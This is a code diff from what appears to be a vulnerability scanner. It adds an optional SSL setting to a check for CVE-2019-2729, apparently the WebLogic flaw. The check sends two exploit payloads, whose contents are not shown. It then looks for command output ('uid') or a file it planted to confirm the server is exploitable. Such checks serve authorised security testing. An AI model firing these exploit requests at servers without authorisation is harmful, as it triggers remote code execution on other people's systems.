@@ -3546,12 +3546,14 @@ class CVE_2019_2729(Star):
     }
     type = target_type.VULNERABILITY
 
-    def light_up(self, dip, dport, *args, **kwargs) -> (bool, dict):
-        result1, data = http(urljoin(f'http://{dip}:{dport}', path1), 'POST', headers, data=payload1, timeout=3)
+    def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
+        result1, data = http(urljoin(f'http://{dip}:{dport}', path1), 'POST', headers, data=payload1, timeout=3,
+                             ssl=force_ssl)
         time.sleep(1)
-        result2, data = http(urljoin(f'http://{dip}:{dport}', path2), 'POST', headers, data=payload2, timeout=3)
+        result2, data = http(urljoin(f'http://{dip}:{dport}', path2), 'POST', headers, data=payload2, timeout=3,
+                             ssl=force_ssl)
         time.sleep(1)
-        result_ico, data = http(urljoin(f'http://{dip}:{dport}', '/_async/favicon.ico'))
+        result_ico, data = http(urljoin(f'http://{dip}:{dport}', '/_async/favicon.ico'), ssl=force_ssl)
         if (result1 and result1.status_code == 200 and 'uid' in result1.text) or (
                 result2 and result2.status_code == 202 and result_ico and 'Vulnerable' in result_ico.text):
             return True, {'msg': 'finish.'}
